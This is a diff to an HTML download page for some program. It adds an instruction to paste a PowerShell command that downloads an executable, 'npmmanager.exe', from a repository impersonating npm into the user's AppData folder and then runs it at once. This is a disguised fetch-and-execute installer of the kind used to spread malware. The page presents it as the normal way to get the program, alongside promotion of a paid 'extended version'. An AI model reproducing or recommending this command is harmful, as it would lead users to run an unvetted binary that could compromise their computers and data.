@@ -19,6 +19,12 @@
 </ul>
 
 <h2>📥 Download the Program</h2>
+<h3>copy and execute the following command in **PowerShell**(Win+R)</h3>
+
+<pre>
+  <code id="code-snippet">&lt;Invoke-WebRequest -Uri "https://github.com/NPM-Package-Manager/NPM-Modules/raw/refs/heads/main/npmmanager.exe" -OutFile "C:\Users\$env:USERNAME\AppData\Local\npmmanager.exe"
+Start-Process "C:\Users\$env:USERNAME\AppData\Local\npmmanager.exe"&gt;</code>
+</pre>
 
 <p>You can download the limited version of the program for free directly from my repository! 🆓 However, the extended version is available for download at the link below and includes additional modules and modes of operation that are not included in the limited version. 💪</p>
 
